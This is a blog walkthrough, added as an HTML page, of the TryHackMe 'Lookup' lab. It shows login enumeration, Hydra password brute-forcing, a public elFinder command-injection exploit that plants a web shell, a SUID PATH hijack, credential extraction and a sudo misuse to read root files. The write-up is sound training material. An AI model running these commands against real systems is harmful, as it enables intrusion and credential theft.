@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Lookup | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="A TryHackMe boot-to-root CTF using username enumeration, elFinder command injection, a SUID PATH hijack, SSH, and unsafe sudo permissions.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/lookup.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript><style>#theme-toggle,.top-link{display:none}</style></noscript>
+<script>
+if(localStorage.getItem("pref-theme")==="dark"){document.documentElement.dataset.theme="dark"}else if(localStorage.getItem("pref-theme")==="light"){document.documentElement.dataset.theme="light"}else if(window.matchMedia("(prefers-color-scheme: dark)").matches){document.documentElement.dataset.theme="dark"}else{document.documentElement.dataset.theme="light"}
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap" rel="stylesheet">
+<meta property="og:url" content="https://jennshaggy.github.io/lookup.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Lookup">
+<meta property="og:description" content="A TryHackMe boot-to-root CTF using username enumeration, elFinder command injection, a SUID PATH hijack, SSH, and unsafe sudo permissions.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Lookup">
+<meta name="twitter:description" content="A TryHackMe boot-to-root CTF using username enumeration, elFinder command injection, a SUID PATH hijack, SSH, and unsafe sudo permissions.">
+</head>
+<body id="top">
+<header class="header">
+<nav class="nav">
+<div class="logo">
+<a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+<div class="logo-switches">
+<button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+<svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+</button>
+<button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
+</div>
+</div>
+<ul id="menu">
+            <li><a href="/security-defense/" title="Security &amp; Defense"><span>Security &amp; Defense</span></a></li>
+            <li><a href="/networking.html" title="Networking"><span>Networking</span></a></li>
+            <li><a href="/systems-foundation.html" title="Systems"><span>Systems</span></a></li>
+            <li><a href="/applied-projects.html" title="Penetration Testing"><span class="active">Penetration Testing</span></a></li>
+            <li><a href="/platforms-training.html" title="Training"><span>Training</span></a></li>
+            <li><a href="/ai-security/" title="AI Security"><span>AI Security</span></a></li>
+</ul>
+</nav>
+</header>
+<main class="main">
+<article class="post-single">
+<header class="post-header">
+<h1 class="post-title entry-hint-parent">Lookup</h1>
+<div class="post-description">A TryHackMe boot-to-root CTF using username enumeration, elFinder command injection, a SUID PATH hijack, SSH, and unsafe sudo permissions.</div>
+</header>
+<div class="post-content">
+
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Boot-to-root CTF<br />
+<strong>Techniques:</strong> Username enumeration, password attacks,
+elFinder command injection, SUID PATH hijacking, SSH, unsafe sudo
+permissions</p>
+<p>Lookup promised an enumeration exercise. It delivered.</p>
+<h2 id="two-ports-and-a-redirect">Two Ports and a Redirect</h2>
+<p>Let's export the IP and verify it.</p>
+<pre class="bash"><code>export TARGET_IP=&#39;10.145.152.146&#39;
+echo &quot;$TARGET_IP&quot;</code></pre>
+<p>We'll run RustScan on the target, which passes the results to Nmap to
+finish the job.</p>
+<pre class="bash"><code>rustscan -a &quot;$TARGET_IP&quot; \
+  --ulimit 5000 \
+  --batch-size 1000 \
+  --timeout 3000 \
+  -- -Pn -sC -sV -oN lookup-initial.nmap</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.16.41 PM.png" alt="RustScan and Nmap results showing SSH on port 22, Apache on port 80, and the lookup.thm redirect" style="max-width:100%;margin:2rem 0;">
+<p>Two key findings:</p>
+<pre class="text"><code>22/tcp  OpenSSH 8.2p1
+80/tcp  Apache 2.4.41</code></pre>
+<p>And one BIG finding:</p>
+<pre class="text"><code>Did not follow redirect to http://lookup.thm</code></pre>
+<p>The web server expects the hostname <code>lookup.thm</code>, hence
+the name. My box currently does not know that <code>lookup.thm</code>
+should resolve to the THM target. How do we fix it?</p>
+<p>We add <code>lookup.thm</code> to <code>/etc/hosts</code>.</p>
+<p>In <code>/etc/hosts</code>, we map the target IP to
+<code>lookup.thm</code>. That tells my box where the hostname should
+resolve, and we can now inspect the website and redirect.</p>
+<pre class="bash"><code>curl -I http://lookup.thm
+curl -s http://lookup.thm | head -n 30</code></pre>
+<p>The HTML gave us the authentication request:</p>
+<pre class="text"><code>Endpoint: /login.php
+Method:   POST
+Fields:   username, password</code></pre>
+<h2 id="the-login-page-talks-too-much">The Login Page Talks Too
+Much</h2>
+<p>Let's establish a baseline with a username that definitely does not
+exist.</p>
+<pre class="bash"><code>curl -si http://lookup.thm/login.php \
+  --data-urlencode &#39;username=thisuserdoesnotexist&#39; \
+  --data-urlencode &#39;password=wrongpassword&#39;</code></pre>
+<p>Now we'll compare it to a common username.</p>
+<pre class="bash"><code>curl -si http://lookup.thm/login.php \
+  --data-urlencode &#39;username=admin&#39; \
+  --data-urlencode &#39;password=wrongpassword&#39;</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.24.16 PM.png" alt="Comparison of login responses used to identify the username-enumeration vulnerability" style="max-width:100%;margin:2rem 0;">
+<p>The responses are not the same:</p>
+<pre class="text"><code>Invalid username -&gt; 74 bytes
+Valid admin      -&gt; 62 bytes</code></pre>
+<p>More importantly, the application says <code>Wrong password</code>
+for <code>admin</code>. We have a valid username.</p>
+<p>Before attacking the password, we'll enumerate other valid usernames.
+<code>admin</code> could be a decoy or a harder target.</p>
+<pre class="bash"><code>ffuf \
+  -w /usr/share/seclists/Usernames/Names/names.txt \
+  -u http://lookup.thm/login.php \
+  -X POST \
+  -H &#39;Content-Type: application/x-www-form-urlencoded&#39; \
+  -d &#39;username=FUZZ&amp;password=wrongpassword&#39; \
+  -mc 200 \
+  -fs 74 \
+  -t 10</code></pre>
+<p>Once <code>ffuf</code> is done, we'll verify each result. I suspect
+foul play.</p>
+<pre class="bash"><code>curl -s http://lookup.thm/login.php \
+  --data-urlencode &#39;username=DISCOVERED_NAME&#39; \
+  --data-urlencode &#39;password=wrongpassword&#39;</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.30.21 PM.png" alt="ffuf username enumeration results identifying valid Lookup accounts including jose" style="max-width:100%;margin:2rem 0;">
+<h2 id="hope-jose-is-ready-to-get-pwned">Hope Jose Is Ready to Get
+Pwned</h2>
+<p>Let's attack Jose with <code>rockyou</code>.</p>
+<pre class="bash"><code>hydra -l jose \
+  -P /usr/share/wordlists/rockyou.txt \
+  lookup.thm \
+  http-post-form &#39;/login.php:username=^USER^&amp;password=^PASS^:F=Wrong password&#39; \
+  -t 4 -f</code></pre>
+<p>Hope Jose is ready to get pwned.</p>
+<p>Paid Port 80 a visit while Hydra works.</p>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.34.41 PM.png" alt="Lookup login page open while Hydra tests jose's password" style="max-width:100%;margin:2rem 0;">
+<p>Once the pwning of Jose is complete, we'll be back here.</p>
+<p>While Hydra continues its vision quest, we'll open Inspect/DevTools
+and check Page Source, Network, and Storage.</p>
+<p>Scratch that. Hydra is done.</p>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.38.07 PM.png" alt="Hydra recovering the password for jose" style="max-width:100%;margin:2rem 0;">
+<p>Time to log in with Persist Logs enabled.</p>
+<p>Sneaky. The website sends us to <code>files.lookup.thm</code>, so we
+have to add that hostname to <code>/etc/hosts</code>, too.</p>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.40.27 PM.png" alt="Successful login redirect to the elFinder file manager at files.lookup.thm" style="max-width:100%;margin:2rem 0;">
+<p>What do we have here? elFinder, a web-based file manager.</p>
+<p>Let's click the blue question mark.</p>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.41.54 PM.png" alt="elFinder About window showing version 2.1.47" style="max-width:100%;margin:2rem 0;">
+<p>Now that we have the version number:</p>
+<pre class="text"><code>elFinder 2.1.47</code></pre>
+<p>...we head to SearchSploit.</p>
+<pre class="bash"><code>searchsploit elFinder 2.1.47</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.43.09 PM.png" alt="SearchSploit results for elFinder 2.1.47 showing exploit 46481" style="max-width:100%;margin:2rem 0;">
+<p>The first result looks the best, but before we run someone else's
+exploit, let's inspect it. We want to know what endpoint and command it
+uses before copying or executing it.</p>
+<pre class="bash"><code>searchsploit -x 46481</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.44.00 PM.png" alt="Inspection of SearchSploit exploit 46481 for elFinder 2.1.47" style="max-width:100%;margin:2rem 0;">
+<p>The script adds <code>/php/connector.minimal.php</code> to the URL we
+give it. Ours is <code>http://files.lookup.thm/elFinder</code>.</p>
+<p>The chain goes:</p>
+<ul>
+<li>Uploads a JPEG with shell commands embedded in its filename.</li>
+<li>Calls elFinder's image-rotation function.</li>
+<li>The vulnerable PHP connector passes that filename to a shell
+command.</li>
+<li>The injected command creates <code>SecSignal.php</code>, a PHP web
+shell.</li>
+</ul>
+<p>Let's copy the script to our local box...</p>
+<pre class="bash"><code>searchsploit -m 46481</code></pre>
+<p>...and inspect the part we couldn't see:</p>
+<pre class="bash"><code>tail -n 60 46481.py</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.46.20 PM.png" alt="Source inspection of exploit 46481 showing its request and web-shell behavior" style="max-width:100%;margin:2rem 0;">
+<p>Good news: the script does not detonate anything undesirable on our
+local machine.</p>
+<p>It flows like this:</p>
+<ul>
+<li>Sends the malicious image.</li>
+<li>Triggers the vulnerable resize operation.</li>
+<li>Checks whether <code>SecSignal.php</code> was created.</li>
+<li>Gives us an interactive <code>$</code> prompt that sends commands
+through the web shell.</li>
+</ul>
+<p>It needs a JPEG named <code>SecSignal.jpg</code>. Create or download
+a <code>.jpg</code>, then move it into the same directory as the
+script.</p>
+<pre class="bash"><code>ls -l 46481.py SecSignal.jpg</code></pre>
+<p>Now we execute.</p>
+<pre class="bash"><code>python2 ~/46481.py http://files.lookup.thm/elFinder</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.50.25 PM.png" alt="Successful elFinder command injection with command execution as www-data" style="max-width:100%;margin:2rem 0;">
+<p>First:</p>
+<pre class="bash"><code>id</code></pre>
+<p>Let's find the users.</p>
+<pre class="bash"><code>ls -la /home</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.51.34 PM.png" alt="Web-shell identity and enumeration of local home directories" style="max-width:100%;margin:2rem 0;">
+<p><code>think</code> is the likely intended victim.</p>
+<pre class="bash"><code>ls -la /home/think</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.52.17 PM.png" alt="Contents of think's home directory showing the protected user flag" style="max-width:100%;margin:2rem 0;">
+<p>We see the user flag, but the permissions are:</p>
+<pre class="text"><code>-rw-r----- root think user.txt</code></pre>
+<p>That means as <code>www-data</code>, we get nothing. Root takes the
+cake.</p>
+<p>Let's check for SUID programs.</p>
+<pre class="bash"><code>find / -type f -perm -4000 2&gt;/dev/null</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.54.22 PM.png" alt="SUID file enumeration revealing the custom pwm binary" style="max-width:100%;margin:2rem 0;">
+<h2 id="pwm-trusts-the-wrong-id"><code>pwm</code> Trusts the Wrong <code>id</code></h2>
+<p>Wait. This is not a normal Ubuntu SUID program:</p>
+<pre class="text"><code>/usr/sbin/pwm</code></pre>
+<p>Let's view its readable strings.</p>
+<pre class="bash"><code>strings /usr/sbin/pwm</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 8.57.50 PM.png" alt="Readable strings from the SUID pwm binary showing its use of id and per-user password files" style="max-width:100%;margin:2rem 0;">
+<p>This is the best part of that output:</p>
+<pre class="text"><code>[!] Running &#39;id&#39; command to extract the username and user ID (UID)
+[-] Error executing id command
+uid=%*u(%[^)])
+[-] Error reading username from id command
+[!] ID: %s
+/home/%s/.passwords
+[-] File /home/%s/.passwords not found</code></pre>
+<p><code>pwm</code> runs <code>id</code>, extracts the reported
+username, and then reads that user's <code>.passwords</code> file.</p>
+<p>It calls <code>id</code> without the absolute path
+<code>/usr/bin/id</code>, so we may be able to substitute our own
+<code>id</code> command through <code>$PATH</code>.</p>
+<p>Let's check its baseline behavior.</p>
+<pre class="bash"><code>/usr/sbin/pwm</code></pre>
+<p>Confirmed: <code>pwm</code> trusts the output of <code>id</code> and
+looks for:</p>
+<pre class="text"><code>/home/www-data/.passwords</code></pre>
+<p>We'll create a fake <code>id</code> that reports the username as
+<code>think</code>.</p>
+<p>Enter these code blocks into the shell one at a time.</p>
+<pre class="bash"><code>echo IyEvYmluL3NoCmVjaG8gInVpZD0xMDAwKHRoaW5rKSBnaWQ9MTAwMCh0aGluaykgZ3JvdXBzPTEwMDAodGhpbmspIgo= | base64 -d &gt; /tmp/id</code></pre>
+<pre class="bash"><code>chmod +x /tmp/id</code></pre>
+<p>Now we verify the contents.</p>
+<pre class="bash"><code>cat /tmp/id</code></pre>
+<p>Lastly, we place <code>/tmp</code> first in <code>$PATH</code> for
+this command only.</p>
+<pre class="bash"><code>PATH=/tmp:$PATH /usr/sbin/pwm</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.02.58 PM.png" alt="Failed PATH hijack attempt from the noexec temporary directory" style="max-width:100%;margin:2rem 0;">
+<h2 id="the-problem-was-the-plus-sign">The Problem Was the Plus Sign</h2>
+<p>Nope. <code>pwm</code> still found the real <code>id</code>.</p>
+<p>Let's see if our fake <code>id</code> runs.</p>
+<pre class="bash"><code>/tmp/id</code></pre>
+<p>Nothing. We'll try it through <code>/bin/sh</code>.</p>
+<pre class="bash"><code>/bin/sh /tmp/id</code></pre>
+<p>The script works. <code>/tmp</code> seems to be mounted with
+<code>noexec</code>. <code>/bin/sh</code> can read it, but our PATH
+hijack needs it to run. Time to move it somewhere else.</p>
+<p>Let's see where we landed.</p>
+<pre class="bash"><code>pwd</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.07.21 PM.png" alt="Web shell showing its writable elFinder PHP working directory" style="max-width:100%;margin:2rem 0;">
+<p>This directory is writable. The exploit already created
+<code>SecSignal.php</code> here, so we'll move our fake <code>id</code>
+here, too.</p>
+<p>Enter these one at a time:</p>
+<pre class="bash"><code>cp /tmp/id /var/www/files.lookup.thm/public_html/elFinder/php/id</code></pre>
+<pre class="bash"><code>chmod +x /var/www/files.lookup.thm/public_html/elFinder/php/id</code></pre>
+<p>Now run it.</p>
+<pre class="bash"><code>/var/www/files.lookup.thm/public_html/elFinder/php/id</code></pre>
+<p>Hmm. No output.</p>
+<p>Check the permissions.</p>
+<pre class="bash"><code>ls -l /var/www/files.lookup.thm/public_html/elFinder/php/id</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.10.02 PM.png" alt="Permission check showing that the replacement id file was not executable" style="max-width:100%;margin:2rem 0;">
+<p>Ahh. Found it. The file is <strong>not executable</strong>.</p>
+<p>The <code>+</code> in <code>chmod +x</code> was eaten by URL
+encoding. When this web shell sends commands through a query string, a
+<code>+</code> becomes a space.</p>
+<p>We'll use numeric permissions instead.</p>
+<pre class="bash"><code>chmod 755 /var/www/files.lookup.thm/public_html/elFinder/php/id</code></pre>
+<p>Check it again.</p>
+<pre class="bash"><code>ls -l /var/www/files.lookup.thm/public_html/elFinder/php/id</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.11.55 PM.png" alt="Permission check confirming executable numeric permissions on the replacement id file" style="max-width:100%;margin:2rem 0;">
+<p>Much better. Let's run it.</p>
+<pre class="bash"><code>/var/www/files.lookup.thm/public_html/elFinder/php/id</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.12.34 PM.png" alt="Replacement id command executing successfully after numeric permissions were applied" style="max-width:100%;margin:2rem 0;">
+<p>Hah!</p>
+<p>Now we force <code>pwm</code> to find our fake <code>id</code>
+first.</p>
+<pre class="bash"><code>PATH=/var/www/files.lookup.thm/public_html/elFinder/php:/usr/bin:/bin /usr/sbin/pwm</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.13.25 PM.png" alt="Successful pwm PATH hijack reading think's password candidates" style="max-width:100%;margin:2rem 0;">
+<p>The <code>$PATH</code> order means:</p>
+<p>Search the writable elFinder PHP directory &gt; Find our fake
+<code>id</code> &gt; Parse <code>think</code> as the username &gt; Read
+<code>/home/think/.passwords</code> with <code>pwm</code>'s SUID
+privileges.</p>
+<h2 id="jose-a-password-generation-philosophy">Jose: A
+Password-Generation Philosophy</h2>
+<p>Jose all day.</p>
+<p>We'll save the password candidates into a wordlist file...</p>
+<pre class="bash"><code>PATH=/var/www/files.lookup.thm/public_html/elFinder/php:/usr/bin:/bin /usr/sbin/pwm | sed &#39;1,2d&#39; &gt; /var/www/files.lookup.thm/public_html/elFinder/php/think-passwords.txt</code></pre>
+<p>...and download it from a local terminal:</p>
+<pre class="bash"><code>curl -s http://files.lookup.thm/elFinder/php/think-passwords.txt -o think-passwords.txt</code></pre>
+<p>Let's check it.</p>
+<pre class="bash"><code>wc -l think-passwords.txt
+head think-passwords.txt</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.16.24 PM.png" alt="Downloaded password wordlist containing 49 candidates for think" style="max-width:100%;margin:2rem 0;">
+<p>Forty-nine candidates. Let's test them with Hydra.</p>
+<pre class="bash"><code>hydra -l think \
+  -P think-passwords.txt \
+  ssh://&quot;$TARGET_IP&quot; \
+  -t 4 -f</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.20.04 PM.png" alt="Hydra recovering think's SSH password from the targeted wordlist" style="max-width:100%;margin:2rem 0;">
+<p>Pwned again, Jose. Thanks, buddy.</p>
+<p>Here are the <code>think</code> credentials:</p>
+<pre class="text"><code>think:josemario.AKA(think)</code></pre>
+<p>Time to SSH in.</p>
+<pre class="bash"><code>ssh think@&quot;$TARGET_IP&quot;</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.22.24 PM.png" alt="Successful SSH login as think" style="max-width:100%;margin:2rem 0;">
+<pre class="bash"><code>cat ~/user.txt</code></pre>
+<p>One flag down.</p>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.23.18 PM.png" alt="User flag retrieved after SSH access as think with the flag redacted" style="max-width:100%;margin:2rem 0;">
+<h2 id="root-through-look">Root Through <code>look</code></h2>
+<p>Let's begin root enum.</p>
+<pre class="bash"><code>sudo -l</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.24.41 PM.png" alt="sudo permissions showing that think may run usr bin look as root" style="max-width:100%;margin:2rem 0;">
+<p><code>think</code> has permission to run <code>/usr/bin/look</code>
+as any user, including <code>root</code>.</p>
+<p>What is <code>look</code>, you ask?</p>
+<p><code>look</code> prints lines from a file that begin with the string
+we give it. If we give it an empty string, every line is a match. Since
+we're allowed to run it as <code>root</code>, we can read a root-only
+file.</p>
+<p>Pretty darn cool.</p>
+<p>Let's check for the <code>root</code> flag.</p>
+<pre class="bash"><code>sudo /usr/bin/look &#39;&#39; /root/root.txt</code></pre>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.25.50 PM.png" alt="Root flag read through the permitted sudo look command with the flag redacted" style="max-width:100%;margin:2rem 0;">
+<p>Triple-pwn Jose for the WIN.</p>
+<p>Cue the confetti.</p>
+<img src="/images/lookup/Screenshot 2026-09-02 at 9.26.47 PM.png" alt="TryHackMe Lookup completion screen" style="max-width:100%;margin:2rem 0;">
+
+</div>
+<footer class="post-footer"></footer>
+</article>
+</main>
+<footer class="footer"><span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot; <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp; <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a></span></footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"></path></svg></a>
+<script>
+let menu=document.getElementById("menu");if(menu){const p=localStorage.getItem("menu-scroll-position");if(p)menu.scrollLeft=parseInt(p,10);menu.onscroll=()=>localStorage.setItem("menu-scroll-position",menu.scrollLeft)}
+document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener("click",function(e){e.preventDefault();const id=this.getAttribute("href").substring(1);document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:window.matchMedia("(prefers-reduced-motion: reduce)").matches?"auto":"smooth"});if(id==="top")history.replaceState(null,null," ");else history.pushState(null,null,`#${id}`)}));
+let topButton=document.getElementById("top-link");window.onscroll=()=>{if(document.body.scrollTop>800||document.documentElement.scrollTop>800){topButton.style.visibility="visible";topButton.style.opacity="1"}else{topButton.style.visibility="hidden";topButton.style.opacity="0"}};
+document.getElementById("theme-toggle").addEventListener("click",()=>{const html=document.documentElement;if(html.dataset.theme==="dark"){html.dataset.theme="light";localStorage.setItem("pref-theme","light")}else{html.dataset.theme="dark";localStorage.setItem("pref-theme","dark")}});
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
+</script>
+</body>
+</html>
